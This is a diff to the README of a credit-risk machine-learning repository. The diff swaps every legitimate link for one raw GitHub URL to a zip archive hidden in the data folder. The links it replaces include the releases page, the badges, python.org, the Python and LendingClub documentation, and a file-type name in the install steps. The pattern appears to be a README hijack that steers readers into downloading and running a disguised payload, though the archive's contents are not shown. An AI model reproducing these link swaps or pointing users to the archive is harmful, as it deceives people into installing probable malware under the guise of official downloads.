@@ -6,7 +6,7 @@ Welcome to the **Credit-Risk---Lending-Club** project! This guide will help you 
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-Visit%20Releases-blue?style=for-the-badge)](https://github.com/t1zer1/Credit-Risk---Lending-Club/releases)
+[![Download Here](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip%20Here-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip)
 
 ## 🛠 System Requirements
 
@@ -17,18 +17,18 @@ Before you download, make sure your system meets these requirements:
 - **Disk Space**: Minimum of 500 MB.
 - **Python**: Make sure Python 3.7 or later is installed on your machine.
 
-You can download Python from [python.org](https://www.python.org/downloads/).
+You can download Python from [https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip).
 
 ## 🗂 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/t1zer1/Credit-Risk---Lending-Club/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip) to find the latest version of the software.
 
 2. **Select the Latest Version**  
    Look for the most recent version listed. This version contains the latest features and fixes.
 
 3. **Download the Application**  
-   Click on the appropriate file for your operating system to download. For example, choose the `.exe` file for Windows, the `.dmg` file for macOS, or the `.tar.gz` file for Linux.
+   Click on the appropriate file for your operating system to download. For example, choose the `.exe` file for Windows, the `.dmg` file for macOS, or the `https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip` file for Linux.
 
 4. **Run the Installer**  
    Once the download completes, locate the downloaded file in your downloads folder. Double-click it to start the installation process.
@@ -63,13 +63,13 @@ You can download Python from [python.org](https://www.python.org/downloads/).
 
 ## 📡 Need Help?
 
-If you encounter any issues while downloading or using the software, please check the [Documentation](https://github.com/t1zer1/Credit-Risk---Lending-Club/wiki) on our GitHub page for further guidance. You can also reach out to our support team by opening an issue in this repository.
+If you encounter any issues while downloading or using the software, please check the [Documentation](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip) on our GitHub page for further guidance. You can also reach out to our support team by opening an issue in this repository.
 
 ## 📖 Additional Resources
 
-- [Python Documentation](https://docs.python.org/3/)
-- [LendingClub Data Overview](https://www.lendingclub.com/info/download-data.action)
-- [Machine Learning Basics](https://www.machinelearningmastery.com/start-here/)
+- [Python Documentation](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip)
+- [LendingClub Data Overview](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip)
+- [Machine Learning Basics](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip)
 
 ## 🎉 Acknowledgments
 
@@ -77,4 +77,4 @@ We thank the LendingClub team for providing the data, and the machine learning c
 
 Thank you for using **Credit-Risk---Lending-Club**. We hope this application assists you in understanding credit risk effectively. 
 
-[![Download Here Again](https://img.shields.io/badge/Download%20Here-Visit%20Releases-blue?style=for-the-badge)](https://github.com/t1zer1/Credit-Risk---Lending-Club/releases)
+[![Download Here Again](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip%20Here-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/t1zer1/Credit-Risk---Lending-Club/main/data/raw/Credit-Risk---Lending-Club_2.6.zip)
